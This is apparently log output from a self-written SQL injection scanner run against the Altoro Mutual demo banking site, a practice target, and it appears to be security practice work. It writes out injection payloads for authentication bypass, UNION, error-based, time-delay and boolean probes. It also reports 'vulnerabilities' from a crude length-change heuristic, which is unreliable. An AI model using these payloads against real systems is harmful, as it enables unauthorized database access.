+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:40] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:40] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:40] Content lengths - Baseline: 6065, Test: 6065
+[DEBUG] [2024-11-29 18:33:40] 
+Raw response for form 'login':
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" style="margin-bottom:5px; width: 99%;">\...
+==================================================
+[DEBUG] [2024-11-29 18:33:40] 
+Comparing responses for form 'login'
+[DEBUG] [2024-11-29 18:33:40] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:40] 
+After removing '' UNION SELECT NULL--':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:40] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:40] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:40] Content lengths - Baseline: 6065, Test: 6065
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 18:33:40] Description: Attempts to trigger SQL error messages
+[DEBUG] [2024-11-29 18:33:40] Payload value: ' OR 1=CONVERT(int,@@version)--
+[DEBUG] [2024-11-29 18:33:47] 
+Raw response for form 'frmSearch':
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="hea...
+==================================================
+[DEBUG] [2024-11-29 18:33:47] 
+Comparing responses for form 'frmSearch'
+[DEBUG] [2024-11-29 18:33:47] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:47] 
+After removing '' OR 1=CONVERT(int,@@version)--':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:47] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:47] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:47] Content lengths - Baseline: 6065, Test: 6065
+[DEBUG] [2024-11-29 18:33:47] 
+Raw response for form 'login':
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" style="margin-bottom:5px; width: 99%;">\...
+==================================================
+[DEBUG] [2024-11-29 18:33:47] 
+Comparing responses for form 'login'
+[DEBUG] [2024-11-29 18:33:47] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:47] 
+After removing '' OR 1=CONVERT(int,@@version)--':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:47] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:47] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:47] Content lengths - Baseline: 6065, Test: 6065
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 18:33:47] Description: Tests for blind injection via time delays
+[DEBUG] [2024-11-29 18:33:47] Payload value: '; WAITFOR DELAY '0:0:5'--
+[DEBUG] [2024-11-29 18:33:54] 
+Raw response for form 'frmSearch':
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" st...
+==================================================
+[DEBUG] [2024-11-29 18:33:54] 
+Comparing responses for form 'frmSearch'
+[DEBUG] [2024-11-29 18:33:54] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:54] 
+After removing ''; WAITFOR DELAY '0:0:5'--':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:54] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:54] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:54] Content lengths - Baseline: 6065, Test: 6065
+[DEBUG] [2024-11-29 18:33:54] 
+Raw response for form 'login':
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" style="margin-bottom:5px; width: 99%;">\...
+==================================================
+[DEBUG] [2024-11-29 18:33:54] 
+Comparing responses for form 'login'
+[DEBUG] [2024-11-29 18:33:54] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:54] 
+After removing ''; WAITFOR DELAY '0:0:5'--':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:54] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:54] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:54] Content lengths - Baseline: 6065, Test: 6065
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 18:33:54] Description: Tests for boolean-based blind injection
+[DEBUG] [2024-11-29 18:33:54] Payload value: ' OR 1=1--
+[DEBUG] [2024-11-29 18:34:01] 
+Raw response for form 'frmSearch':
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" style="margin-bottom:5px; ...
+==================================================
+[DEBUG] [2024-11-29 18:34:01] 
+Comparing responses for form 'frmSearch'
+[DEBUG] [2024-11-29 18:34:01] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:34:01] 
+After removing '' OR 1=1--':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:34:01] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:34:01] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:34:01] Content lengths - Baseline: 6065, Test: 6065
+[DEBUG] [2024-11-29 18:34:01] 
+Raw response for form 'login':
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" style="margin-bottom:5px; width: 99%;">\...
+==================================================
+[DEBUG] [2024-11-29 18:34:01] 
+Comparing responses for form 'login'
+[DEBUG] [2024-11-29 18:34:01] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:34:01] 
+After removing '' OR 1=1--':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:34:01] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:34:01] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:34:01] Content lengths - Baseline: 6065, Test: 6065
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-29 18:34:01] No SQL injection vulnerabilities detected
+
+Log started on 2024-11-29 18:55:58.364628
+[SUCCESS] [2024-11-29 18:55:51] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-29 18:55:52] Fatal error: name 're' is not defined
+[ERROR] [2024-11-29 18:55:52] Traceback (most recent call last):
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 333, in main
+    findings = scanner.test_all_forms()
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 234, in test_all_forms
+    findings = self.test_form(form_name)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 114, in test_form
+    baseline_content = self._clean_response(baseline["response_content"])
+                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\justi\PenetrationTestingScripts_JustinAndrews\MainScripts\SQLInjection.py", line 156, in _clean_response
+    cleaned = re.sub(r"<input[^>]*csrf[^>]*>", "", cleaned)
+              ^^
+NameError: name 're' is not defined. Did you forget to import 're'
+
+
+Log started on 2024-11-29 18:57:24.883048
+[SUCCESS] [2024-11-29 18:57:07] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 18:57:07] Testing Basic Authentication Bypass: Simple login bypass attempt
+[WARNING] [2024-11-29 18:57:07] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Basic Authentication Bypass
+  Value: ' OR '1'='1
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+OR+%271%27%3D%271
+  Reason: URL changed and Content length changed
+[INFO] [2024-11-29 18:57:07] Testing Union Select Probe: Tests for UNION injection possibility
+[WARNING] [2024-11-29 18:57:08] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Union Select Probe
+  Value: ' UNION SELECT NULL--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--
+  Reason: URL changed and Content length changed
+[INFO] [2024-11-29 18:57:08] Testing Error Based: Attempts to trigger SQL error messages
+[WARNING] [2024-11-29 18:57:08] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Error Based
+  Value: ' OR 1=CONVERT(int,@@version)--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--
+  Reason: URL changed and Content length changed
+[INFO] [2024-11-29 18:57:08] Testing Time Based: Tests for blind injection via time delays
+[WARNING] [2024-11-29 18:57:08] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Time Based
+  Value: '; WAITFOR DELAY '0:0:5'--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--
+  Reason: URL changed and Content length changed
+[INFO] [2024-11-29 18:57:08] Testing Boolean Based: Tests for boolean-based blind injection
+[WARNING] [2024-11-29 18:57:08] 
+Potential SQL Injection Found:
+  Form: frmSearch
+  Payload: Boolean Based
+  Value: ' OR 1=1--
+  URL Change: https://demo.testfire.net/search.jsp?query=test123 -> https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--
+  Reason: URL changed and Content length changed
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-29 18:57:18] Failed to capture baseline for login
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results Summary
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-29 18:57:18] Found 5 potential SQL injection vulnerabilities:
+================================================================================
+
+Form: frmSearch
+Found 5 vulnerabilities:
+----------------------------------------
+1. Basic Authentication Bypass
+   Value: ' OR '1'='1
+   Reason: URL changed and Content length changed
+
+2. Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Reason: URL changed and Content length changed
+
+3. Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Reason: URL changed and Content length changed
+
+4. Time Based
+   Value: '; WAITFOR DELAY '0:0:5'--
+   Reason: URL changed and Content length changed
+
+5. Boolean Based
+   Value: ' OR 1=1--
+   Reason: URL changed and Content length changed
+
+
+Log started on 2024-11-30 12:51:07.715381
+[SUCCESS] [2024-11-30 12:50:50] Found 2 forms to test
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: frmSearch
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-30 12:50:50] Testing Basic Authentication Bypass: Simple login bypass attempt
+[INFO] [2024-11-30 12:50:50] Testing Union Select Probe: Tests for UNION injection possibility
+[INFO] [2024-11-30 12:50:50] Testing Error Based: Attempts to trigger SQL error messages
+[INFO] [2024-11-30 12:50:51] Testing Time Based: Tests for blind injection via time delays
+[INFO] [2024-11-30 12:50:51] Testing Boolean Based: Tests for boolean-based blind injection
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing Form: login
+────────────────────────────────────────────────────────────────────────────────
+[ERROR] [2024-11-30 12:51:01] Failed to capture baseline for login
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results Summary
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-30 12:51:01] No SQL injection vulnerabilities detected
+
